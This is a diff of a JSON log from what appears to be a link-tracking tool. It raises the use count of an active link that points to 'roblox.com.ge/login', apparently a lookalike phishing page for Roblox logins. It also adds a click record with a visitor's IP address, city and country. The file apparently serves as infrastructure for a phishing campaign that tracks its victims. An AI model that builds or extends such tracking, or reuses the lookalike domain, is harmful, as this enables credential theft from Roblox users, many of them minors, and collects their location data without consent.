@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1649,
+    "useCount": 1650,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13360,6 +13360,14 @@
         "city": "Lima",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777577471374,
+        "ip": "185.188.219.22",
+        "country": "Kosovo",
+        "city": "Llazicë",
+        "flag": "🇽🇰",
+        "countryCode": "XK"
       }
     ]
   },
